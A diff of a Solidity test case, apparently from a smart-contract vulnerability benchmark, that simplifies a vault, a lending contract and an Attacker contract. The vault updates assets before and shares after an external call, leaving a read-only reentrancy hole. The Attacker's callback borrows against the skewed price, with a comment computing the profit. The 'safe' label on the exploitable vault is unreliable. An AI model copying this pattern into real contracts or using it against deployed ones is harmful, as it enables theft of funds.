@@ -1,31 +1,27 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface ERC20 {
-	function balance(address) external view returns (uint256);
-	function transferFrom(address from, address to, uint256 amt) external returns (bool);
-}
 
 
 contract ReadOnlyLend_safe1 {
-    mapping(address => uint) public balances;
-	uint256 public totalStake;
+    uint public assets;
+	uint public shares;
 
     function withdraw(uint amt) external {
-        require(balances[msg.sender] >= amt);
-        balances[msg.sender] -= amt;	// this is updated BEFORE the external call
+        require(assets >= amt);
+        assets -= amt;	// updated BEFORE the external call
         (bool ok,) = msg.sender.call{value: amt}("");
         require(ok);
-        totalStake -= amt;	// this is updated AFTER the external call
+        shares -= amt;	// updated AFTER the external call
     }
 
 	function deposit() external payable {
-		balances[msg.sender] += msg.value;
-		totalStake += msg.value;
+		assets += msg.value;
+		shares += msg.value;
 	}
 
-    function getPrice(address token) public view returns (uint256) {
-        return ERC20(token).balance(address(this)) * 1e18 / totalStake;
+    function getPrice() public view returns (uint) {
+        return assets * 1e18 / shares;
     }
 
 }
@@ -37,9 +33,8 @@ contract ReadOnlyLend_safe1_Lending {
         vault = ReadOnlyLend_safe1(v);
     }
 
-    function swap(address token, uint amt) external {
-		ERC20(token).transferFrom(msg.sender, address(this), amt);
-        uint256 out = amt / vault.getPrice(token);
+    function borrow(uint amt) external {
+        uint256 out = amt / vault.getPrice();
 		(bool ok,) = msg.sender.call{value: out}("");
 		require(ok);
     }
@@ -61,6 +56,6 @@ contract Attacker {
     }
 
     receive() external payable {
-        lending.swap(100);	// borrows 100 / 0.5 = 200 shares, which is more than the 100 shares deposited, therefore this is profitable
+        lending.borrow(100);	// borrows 100 / 0.5 = 200 shares, which is more than the 100 shares deposited, therefore this is profitable
     }
 }
